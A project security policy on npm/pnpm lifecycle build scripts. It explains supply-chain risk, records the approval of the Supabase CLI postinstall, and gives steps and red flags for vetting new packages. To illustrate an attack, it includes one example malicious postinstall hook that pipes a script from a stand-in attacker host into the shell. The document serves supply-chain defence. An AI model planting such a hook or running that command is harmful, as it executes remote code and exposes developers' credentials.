# Security Documentation

## Build Scripts and Supply Chain Security

### Overview

This document explains our approach to package build scripts and the security decisions made for this project.

---

## What Are Build Scripts?

Build scripts are npm lifecycle hooks that run automatically during `npm install` or `pnpm install`. Common examples:

- `preinstall` - Runs before package installation
- `postinstall` - Runs after package installation
- `prepare` - Runs before package is published

### The Security Risk

**Supply chain attacks** exploit build scripts by executing malicious code during installation:

```json
// Example malicious package
{
  "scripts": {
    "postinstall": "curl https://attacker.com/steal.sh | sh"
  }
}
```

When you run `pnpm install malicious-package`, this script:

- Executes with your user permissions
- Can access environment variables (API keys, tokens)
- Can read/write files in your project
- Can exfiltrate data to external servers

**Real-world examples:**

- [event-stream incident (2018)](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident) - Cryptocurrency wallet theft
- [ua-parser-js (2021)](https://github.com/advisories/GHSA-pjwm-rvh2-c87w) - Malware injection
- [coa/rc packages (2021)](https://blog.sonatype.com/npm-hijackers-at-it-again-popular-coa-and-rc-libraries-taken-over-to-spread-malware) - Password stealing

---

## pnpm's Protection Mechanism

**pnpm blocks all build scripts by default** as a security measure. This means:

✅ **Protected:** No arbitrary code execution during install
❌ **Trade-off:** Some packages won't work without approval

To use packages with build scripts, you must explicitly approve them:

```bash
pnpm approve-builds package-name
```

This forces developers to **consciously review** what they're allowing to run.

---

## Approved Packages

### Supabase CLI (`supabase@2.70.5`)

**Status:** ✅ APPROVED
**Date:** 2026-01-04
**Approved By:** Initial project setup

#### Why We Trust Supabase CLI

**1. Publisher Verification**

- **Organization:** [Supabase Inc.](https://github.com/supabase)
- **npm Verified:** ✓ Verified publisher badge
- **Weekly Downloads:** 1.5+ million
- **Repository:** https://github.com/supabase/cli (open source)

**2. Transparent Postinstall Script**
The postinstall script **only** does the following:

1. Detects your OS and architecture (macOS/Linux/Windows, x64/arm64)
2. Downloads the pre-compiled Supabase CLI binary from **official GitHub releases**
3. Verifies SHA256 checksum to prevent tampering
4. Extracts the binary to `bin/supabase`
5. Creates symlinks for command-line access

**Source:** [`scripts/postinstall.js`](https://github.com/supabase/cli/blob/main/npm/scripts/postinstall.js)

**3. Industry Standard Pattern**
This approach is used by trusted packages:

- `esbuild` - JavaScript bundler (downloads Go binary)
- `playwright` - Browser testing (downloads browser binaries)
- `turbo` - Build system (downloads Rust binary)

**4. Verification Steps Taken**

- ✓ Reviewed postinstall.js source code
- ✓ Confirmed binary downloaded from github.com/supabase/cli releases
- ✓ Verified checksum validation is performed
- ✓ No network calls to external/unknown domains
- ✓ No file system access outside package directory

#### What Gets Downloaded

When you approve Supabase, it downloads:

```
https://github.com/supabase/cli/releases/download/v{version}/supabase_{platform}_{arch}.tar.gz
```

Example for macOS Apple Silicon:

```
https://github.com/supabase/cli/releases/download/v2.70.5/supabase_darwin_arm64.tar.gz
```

The binary is then verified against checksums published at:

```
https://github.com/supabase/cli/releases/download/v{version}/supabase_{version}_checksums.txt
```

---

## Alternative Approaches Considered

### Option 1: Use npx Instead

```bash
npx supabase migration new my_migration
```

**Security:** Same as approving build script (runs postinstall in temp directory)
**Rejected because:** No security benefit, worse developer experience

### Option 2: Global Homebrew Installation

```bash
brew install supabase/tap/supabase
```

**Security:** Most isolated (no npm involvement)
**Rejected because:**

- Not documented in package.json
- Requires manual setup instructions
- Version not locked to project
- Doesn't work on non-macOS systems

### Option 3: Manual Binary Download

Download and verify binary manually from GitHub releases.

**Security:** Complete control over installation
**Rejected because:**

- Very poor developer experience
- Error-prone (easy to forget to update)
- Not reproducible across team

---

## Developer Guidelines

### For Current Developers

The Supabase CLI is already approved. After running `pnpm install`, you can use:

```bash
pnpm db:migration:new my_migration_name
pnpm db:push
pnpm db:types YOUR_PROJECT_ID > src/types/database.ts
```

These scripts use `npx supabase` under the hood for maximum compatibility.

### For Future Package Approvals

If pnpm warns about build scripts for a new package:

**DO NOT** blindly approve. Follow these steps:

1. **Investigate the package:**
   - Check npm downloads (low downloads = higher risk)
   - Verify publisher (verified badge?)
   - Check GitHub repository (active? legitimate?)

2. **Review the build script:**

   ```bash
   cat node_modules/<package-name>/package.json | grep -A 10 '"scripts"'
   cat node_modules/<package-name>/scripts/postinstall.js  # if exists
   ```

3. **Ask these questions:**
   - Does it download binaries? From where?
   - Does it make network requests? To which domains?
   - Does it access the file system? What directories?
   - Is this package essential, or can we use an alternative?

4. **Document the decision:**
   - Add entry to this file (SECURITY.md)
   - Explain why you trust the package
   - Note what the script does

5. **Approve if safe:**
   ```bash
   pnpm approve-builds package-name
   ```

### Red Flags (DO NOT APPROVE)

❌ Package with very low downloads (<1000/week)
❌ Unverified publisher
❌ No source code repository
❌ Obfuscated postinstall script
❌ Network requests to unknown domains
❌ File system access outside package directory
❌ Executes shell commands from remote sources

---

## Incident Response

If you suspect a compromised package:

1. **Immediately:**
   - Stop using the package
   - Remove from `package.json`
   - Run `pnpm install` to clean up

2. **Investigate:**
   - Check [Snyk vulnerability database](https://security.snyk.io/)
   - Check [GitHub Security Advisories](https://github.com/advisories)
   - Review package's GitHub issues for reports

3. **Rotate secrets if needed:**
   - If the package had access to `.env` files, rotate all API keys
   - Check Supabase logs for unauthorized access
   - Review git history for unexpected commits

4. **Report:**
   - File issue on package's GitHub
   - Report to npm: security@npmjs.com
   - Update this document with findings

---

## Automated Security Scanning

This project uses the following security measures:

### Dependency Scanning

```bash
# Check for known vulnerabilities
pnpm audit

# Check for outdated packages with security issues
pnpm outdated
```

Run these commands regularly (at least monthly).

### Future Improvements

Consider adding:

- [ ] Automated security audits in CI/CD
- [ ] Dependabot for automatic security updates
- [ ] Socket.dev for real-time supply chain protection
- [ ] npm-lockfile-lint for package integrity checks

---

## References

- [pnpm Security Documentation](https://pnpm.io/cli/audit)
- [npm Security Best Practices](https://docs.npmjs.com/packages-and-modules/securing-your-code)
- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)
- [Supabase CLI Source Code](https://github.com/supabase/cli)

---

## Changelog

| Date       | Package  | Version | Decision | Reason                                                                                                                                                |
| ---------- | -------- | ------- | -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2026-01-04 | supabase | 2.70.5  | APPROVED | Official CLI for database migrations. Transparent postinstall (downloads verified binary from GitHub). Trusted publisher with 1.5M+ weekly downloads. |

---

## Questions?

If you have questions about this security policy, please:

1. Review this document thoroughly
2. Check the package's source code on GitHub
3. Consult with the team lead before approving new packages
